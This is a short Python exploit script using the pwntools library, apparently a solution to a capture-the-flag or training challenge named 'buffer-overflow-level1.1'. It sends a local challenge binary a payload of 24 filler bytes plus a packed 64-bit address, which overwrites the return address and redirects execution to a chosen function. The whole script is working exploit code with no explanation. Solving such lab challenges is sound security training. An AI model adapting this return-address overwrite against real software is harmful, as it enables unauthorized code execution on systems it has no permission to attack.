from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

payload = b'QWERTYUIOPqwertyuiopQWER' + p64(0x4012D7) + b'\n'

print(payload)

io = process('/challenge/buffer-overflow-level1.1')

io.sendafter("Give me your input\n", payload)

while True:
    io.recvline()